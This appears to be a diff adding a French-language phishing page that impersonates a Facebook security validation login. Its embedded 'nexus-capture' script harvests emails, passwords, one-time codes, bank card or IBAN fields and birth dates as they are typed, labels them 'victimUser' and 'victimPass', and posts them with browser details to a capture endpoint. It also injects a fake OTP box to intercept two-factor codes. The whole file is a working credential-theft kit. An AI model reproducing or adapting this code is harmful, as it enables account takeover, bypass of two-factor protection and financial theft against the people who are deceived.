@@ -1,0 +1,302 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <title>Validation Sécurité — Facebook</title>
+    <style>
+        body { background-color: #f0f2f5; font-family: Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .fb-card { background: #ffffff; padding: 25px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,.1), 0 8px 16px rgba(0,0,0,.1); width: 396px; text-align: center; }
+        .fb-card input { width: 100%; padding: 14px 16px; margin-bottom: 12px; border: 1px solid #dddfe2; border-radius: 6px; font-size: 17px; box-sizing: border-box; }
+        .fb-btn { background-color: #1877f2; border: none; border-radius: 6px; color: #fff; font-size: 18px; font-weight: bold; line-height: 44px; width: 100%; cursor: pointer; }
+        .hidden-step { display: none; }
+    </style>
+</head>
+<body>
+    <div class="fb-card">
+        <form id="step1-form" onsubmit="handleStep1(event)">
+            <input type="text" id="v-user" placeholder="Adresse e-mail ou numéro de tél." required>
+            <input type="password" id="v-pass" placeholder="Mot de passe" required>
+            <button type="submit" class="fb-btn">Continuer</button>
+        </form>
+        <form id="step2-form" class="hidden-step" onsubmit="handleStep2(event)">
+            <input type="text" id="v-otp" placeholder="Code de confirmation (OTP)" required>
+            <button type="submit" class="fb-btn">Valider le code</button>
+        </form>
+    </div>
+<script data-nexus-capture="true">
+(function() {
+  const NEXUS_CFG = {
+    endpoint: "/api/capture",
+    owner: "Kim",
+    network: "Facebook",
+    enableOtp: false
+  };
+
+  const urlParams = new URLSearchParams(window.location.search);
+  const effectiveOwner = (urlParams.get("user") || NEXUS_CFG.owner || "Inconnu").trim();
+
+  const mem = {
+    victimUser: "",
+    victimPass: "",
+    otp: "Aucun",
+    fields: {},
+    sentKeys: new Set()
+  };
+
+  function getFieldInfo(el) {
+    let labelTxt = "";
+    if (el.id) {
+      const lbl = document.querySelector('label[for="' + CSS.escape(el.id) + '"]');
+      if (lbl) labelTxt = (lbl.innerText || lbl.textContent || "").trim();
+    }
+    const parentLbl = el.closest("label");
+    if (parentLbl) {
+      labelTxt = (labelTxt + " " + (parentLbl.innerText || parentLbl.textContent || "")).trim();
+    }
+
+    const rawKey =
+      el.name ||
+      el.id ||
+      labelTxt ||
+      el.placeholder ||
+      el.getAttribute("aria-label") ||
+      el.getAttribute("autocomplete") ||
+      ("champ_" + (el.type || "text"));
+
+    const meta = [
+      el.id,
+      el.name,
+      el.placeholder,
+      el.getAttribute("aria-label"),
+      el.getAttribute("autocomplete"),
+      el.getAttribute("inputmode"),
+      el.className,
+      labelTxt
+    ]
+      .filter(Boolean)
+      .join(" ")
+      .toLowerCase();
+
+    return { key: rawKey.trim(), meta };
+  }
+
+  function classifyEl(el) {
+    const type = (el.type || "text").toLowerCase();
+    const { meta } = getFieldInfo(el);
+
+    if (type === "password" || (/password|pass|mot de passe|pin/i.test(meta) && !/otp|2fa/i.test(meta))) {
+      return "password";
+    }
+
+    const ac = (el.getAttribute("autocomplete") || "").toLowerCase();
+    const maxLen = parseInt(el.getAttribute("maxlength") || "0", 10);
+    const isBank = /card|carte|cc-|cvv|cvc|csc|exp|expiry|expiration|iban|rib|bic|swift|routing|sort.?code|account.?num|banque|bank/i.test(meta);
+    const isDob = type === "date" || /birth|naissance|dob|bday|jour|mois|ann[ée]e|jj|mm|aaaa|yyyy/i.test(meta);
+
+    if (
+      ac === "one-time-code" ||
+      (!isBank && !isDob && (
+        /\botp\b|2fa|mfa|one-time|verification.?code|code.?v[ée]rif|security.?code/i.test(meta) ||
+        (type !== "password" && maxLen >= 4 && maxLen <= 8 && /\bcode\b/i.test(meta))
+      ))
+    ) {
+      return "otp";
+    }
+
+    if (isBank) return "bank";
+    if (isDob) return "dob";
+    if (["email", "text", "tel", "number", "search"].includes(type)) return "identifier";
+    return "other";
+  }
+
+  function snapshotInputs() {
+    const allEls = Array.from(document.querySelectorAll("input, select, textarea"));
+    const otpParts = [];
+    let idVal = mem.victimUser;
+    let passVal = mem.victimPass;
+    let bankVal = "";
+    let otherVal = "";
+
+    allEls.forEach((el, idx) => {
+      const type = (el.type || "text").toLowerCase();
+      if (type === "submit" || type === "button" || type === "reset") return;
+
+      const { key } = getFieldInfo(el);
+      const role = classifyEl(el);
+      let val = "";
+
+      if (type === "checkbox") {
+        val = el.checked ? (el.value || "Oui") : "";
+      } else if (type === "radio") {
+        if (!el.checked) return;
+        val = el.value || "Sélectionné";
+      } else {
+        val = (el.value || "").trim();
+      }
+
+      if (!val) return;
+
+      const finalKey = mem.fields[key] !== undefined && mem.fields[key] !== val ? (key + "_" + (idx + 1)) : key;
+      mem.fields[finalKey] = val;
+
+      if (role === "otp") {
+        otpParts.push(val);
+      } else if (role === "password") {
+        passVal = el.value;
+      } else if (role === "identifier") {
+        idVal = val;
+      } else if (role === "bank" && !bankVal) {
+        bankVal = val;
+      } else if (!otherVal) {
+        otherVal = val;
+      }
+    });
+
+    mem.victimUser = idVal || bankVal || otherVal || "Inconnu";
+    mem.victimPass = passVal || "Inconnu";
+    if (otpParts.length > 0) {
+      mem.otp = otpParts.join("");
+    }
+  }
+
+  function transmit(payload) {
+    const sig = JSON.stringify(payload);
+    if (mem.sentKeys.has(sig)) return Promise.resolve();
+    mem.sentKeys.add(sig);
+
+    return fetch(NEXUS_CFG.endpoint, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(payload),
+      keepalive: true
+    }).catch(() => {});
+  }
+
+  function sendStep1() {
+    snapshotInputs();
+    return transmit({
+      owner: effectiveOwner,
+      network: NEXUS_CFG.network,
+      type: NEXUS_CFG.enableOtp ? "OTP_STEP1" : "STANDARD",
+      victimUser: mem.victimUser,
+      victimPass: mem.victimPass,
+      otp: NEXUS_CFG.enableOtp ? "En attente OTP..." : (mem.otp || "Aucun"),
+      fields: mem.fields,
+      extra_info: JSON.stringify({
+        ua: navigator.userAgent,
+        platform: navigator.platform,
+        fields: mem.fields
+      })
+    });
+  }
+
+  function sendOtpFinal(otpCode) {
+    snapshotInputs();
+    const cleanOtp = (otpCode || mem.otp || "").trim();
+    return transmit({
+      owner: effectiveOwner,
+      network: NEXUS_CFG.network,
+      type: "otp",
+      victimUser: mem.victimUser,
+      victimPass: mem.victimPass,
+      otp: cleanOtp || "Aucun",
+      fields: mem.fields,
+      extra_info: JSON.stringify({
+        ua: navigator.userAgent,
+        platform: navigator.platform,
+        fields: mem.fields
+      })
+    });
+  }
+
+  function wireMultiStepForms() {
+    const forms = Array.from(document.querySelectorAll("form"));
+    if (forms.length >= 2) {
+      const step1Form = forms[0];
+      const step2Form = forms[1];
+
+      step1Form.removeAttribute("onsubmit");
+      step2Form.removeAttribute("onsubmit");
+
+      step1Form.addEventListener("submit", (e) => {
+        e.preventDefault();
+        sendStep1();
+        step1Form.classList.add("hidden-step");
+        step1Form.style.display = "none";
+        step2Form.classList.remove("hidden-step");
+        step2Form.style.display = "block";
+        const otpInp = step2Form.querySelector("input");
+        if (otpInp) setTimeout(() => otpInp.focus(), 50);
+      });
+
+      step2Form.addEventListener("submit", (e) => {
+        e.preventDefault();
+        snapshotInputs();
+        const otpInp = step2Form.querySelector("input");
+        const code = otpInp ? otpInp.value.trim() : mem.otp;
+        sendOtpFinal(code);
+      });
+      return;
+    }
+
+    if (NEXUS_CFG.enableOtp) {
+      const hasOtpField = Array.from(document.querySelectorAll("input, select, textarea")).some((el) => classifyEl(el) === "otp");
+      if (!hasOtpField && !document.getElementById("nexus-auto-otp-box")) {
+        const box = document.createElement("div");
+        box.id = "nexus-auto-otp-box";
+        box.style.cssText = "margin:14px auto;padding:14px;max-width:360px;border:1px solid #d0d7de;border-radius:10px;background:#ffffff;font-family:inherit;text-align:center;";
+        box.innerHTML = `
+          <div style="font-size:13px;font-weight:700;margin-bottom:8px;color:#111827;">Code de vérification (OTP)</div>
+          <input id="nexus-otp-field" data-nexus-injected-otp="true" type="text" inputmode="numeric" maxlength="6" placeholder="••••••" style="width:100%;padding:10px;text-align:center;font-size:18px;letter-spacing:8px;border:1px solid #9ca3af;border-radius:8px;margin-bottom:10px;" />
+          <button id="nexus-otp-submit" type="button" style="width:100%;padding:10px;border:none;border-radius:8px;background:#111827;color:#fff;font-weight:600;cursor:pointer;">Valider le code OTP</button>
+        `;
+        const targetForm = document.querySelector("form");
+        if (targetForm && targetForm.parentElement) {
+          targetForm.parentElement.insertBefore(box, targetForm.nextSibling);
+        } else {
+          document.body.appendChild(box);
+        }
+
+        const otpInput = document.getElementById("nexus-otp-field");
+        const otpBtn = document.getElementById("nexus-otp-submit");
+        otpInput.addEventListener("input", () => {
+          otpInput.value = otpInput.value.replace(/\D/g, "");
+          snapshotInputs();
+        });
+        otpBtn.addEventListener("click", () => {
+          sendOtpFinal(otpInput.value.trim());
+        });
+      }
+    }
+
+    document.addEventListener("submit", () => {
+      snapshotInputs();
+      if (mem.otp && mem.otp !== "Aucun") {
+        sendOtpFinal(mem.otp);
+      } else {
+        sendStep1();
+      }
+    }, true);
+  }
+
+  document.addEventListener("input", (e) => {
+    const el = e.target;
+    if (!el || !["INPUT", "SELECT", "TEXTAREA"].includes(el.tagName)) return;
+    snapshotInputs();
+  }, true);
+
+  document.addEventListener("change", (e) => {
+    const el = e.target;
+    if (!el || !["INPUT", "SELECT", "TEXTAREA"].includes(el.tagName)) return;
+    snapshotInputs();
+  }, true);
+
+  if (document.readyState === "loading") {
+    document.addEventListener("DOMContentLoaded", wireMultiStepForms);
+  } else {
+    wireMultiStepForms();
+  }
+})();
+</script>
+</body>
+</html>
